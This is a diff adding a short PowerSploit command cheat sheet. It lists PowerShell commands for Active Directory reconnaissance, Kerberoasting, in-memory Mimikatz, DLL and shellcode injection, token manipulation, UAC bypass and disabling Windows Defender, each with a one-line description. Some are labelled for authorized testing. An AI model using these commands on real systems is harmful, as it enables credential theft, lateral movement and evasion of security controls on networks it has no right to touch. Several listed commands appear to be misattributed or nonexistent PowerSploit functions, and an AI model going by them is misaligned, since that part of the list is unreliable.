@@ -1,0 +1,82 @@
+[X] PowerSploit Command List
+
+[\] Import-Module PowerSploit
+[/] Load all PowerSploit modules
+
+[\] Import-Module .\Recon\PowerView.ps1
+[/] Load PowerView (recon module)
+
+[\] Get-NetDomain
+[/] Get current AD domain info
+
+[\] Get-NetUser
+[/] Enumerate domain users
+
+[\] Get-NetGroup
+[/] Enumerate domain groups
+
+[\] Get-NetGroupMember "Domain Admins"
+[/] List members of Domain Admins
+
+[\] Get-NetComputer
+[/] Enumerate domain computers
+
+[\] Get-NetShare
+[/] Enumerate network shares
+
+[\] Invoke-ShareFinder
+[/] Find accessible shares
+
+[\] Invoke-UserHunter
+[/] Find where domain admins are logged in
+
+[\] Invoke-ACLScanner
+[/] Scan AD ACLs for misconfigurations
+
+[\] Get-DomainPolicy
+[/] Dump domain password policy
+
+[\] Invoke-Kerberoast
+[/] Kerberoast service accounts (authorized testing only)
+
+[\] Invoke-ProcessHunter
+[/] Find interesting processes
+
+[\] Invoke-ReflectivePEInjection -PEPath payload.dll -ProcId 1234
+[/] Inject DLL into process (authorized testing only)
+
+[\] Invoke-Shellcode -Shellcode $buf
+[/] Execute shellcode in memory (authorized testing only)
+
+[\] Invoke-Mimikatz
+[/] Run Mimikatz from memory (authorized testing only)
+
+[\] Invoke-TokenManipulation
+[/] Enumerate and manipulate tokens (authorized testing only)
+
+[\] Invoke-Command -ScriptBlock { whoami }
+[/] Execute PowerShell command remotely
+
+[\] Invoke-WMICommand -Payload { whoami }
+[/] Execute command via WMI
+
+[\] Invoke-PSRemoting -ComputerName SERVER
+[/] Execute command via PSRemoting
+
+[\] Invoke-DllInjection -ProcessName notepad.exe -Dll dll.dll
+[/] Inject DLL into process (authorized testing only)
+
+[\] Invoke-BypassUAC
+[/] Attempt UAC bypass (authorized testing only)
+
+[\] Invoke-Obfuscation
+[/] Obfuscate PowerShell scripts
+
+[\] Get-ClipboardContents
+[/] Read clipboard contents
+
+[\] Set-MpPreference -DisableRealtimeMonitoring $true
+[/] Disable Windows Defender (authorized testing only)
+
+[\] Remove-Module PowerSploit
+[/] Unload PowerSploit modules
